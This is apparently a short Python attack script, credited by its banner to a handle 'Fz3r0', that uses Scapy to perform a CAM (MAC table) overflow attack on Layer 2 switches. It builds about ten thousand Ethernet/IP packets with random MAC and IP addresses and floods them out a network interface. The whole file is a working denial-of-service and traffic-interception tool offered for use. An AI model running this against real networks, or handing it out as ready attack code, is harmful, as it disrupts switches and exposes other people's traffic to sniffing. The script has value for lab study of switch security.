# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# "                                                               "
# "                                                               "
# "      /$$$$$$$$               /$$$$$$             /$$$$$$      "
# "     | $$_____/              /$$__  $$           /$$$_  $$     "
# "     | $$          /$$$$$$$$|__/  \ $$  /$$$$$$ | $$$$\ $$     "
# "     | $$$$$ /$$$$|____ /$$/   /$$$$$/ /$$__  $$| $$ $$ $$     "
# "     | $$__/|____/   /$$$$/   |___  $$| $$  \__/| $$\ $$$$     "
# "     | $$           /$$__/   /$$  \ $$| $$      | $$ \ $$$     "
# "     | $$          /$$$$$$$$|  $$$$$$/| $$      |  $$$$$$/     "
# "     |__/         |________/ \______/ |__/       \______/      "
# "                                                               "
# "                  I can read people's minds...                 "
# "          I have read the pasts, presents and futures          "
# "                And each mind that I peered into               "
# "     was stuffed with the same single object of obssesion      "
# "                                                               "
# "                    -- HECHO EN MEXICO --                      "
# "                                                               "
# "                     Twitter:  @fz3r0_OPs                      "
# "                     GitHub :  Fz3r0                           " 
# "                                                               "
# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# "  A script to perform CAM overflow attack on Layer 2 switches  "  
# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

#!/usr/bin/env python
from scapy.all import Ether, IP, TCP, RandIP, RandMAC, sendp

    # Filling packet_list with ten thousand random Ethernet packets
    # CAM overflow attacks need to be super fast.
    # For that reason it's better to create a packet list before hand.

def generate_packets():
    packet_list = []        # initializing packet_list to hold all the packets
    for i in xrange(1,10000):
        packet  = Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
        packet_list.append(packet)
    return packet_list

def cam_overflow(packet_list):
    sendp(packet_list, iface='tap0')

if __name__ == '__main__':
    packet_list = generate_packets()
    cam_overflow(packet_list)
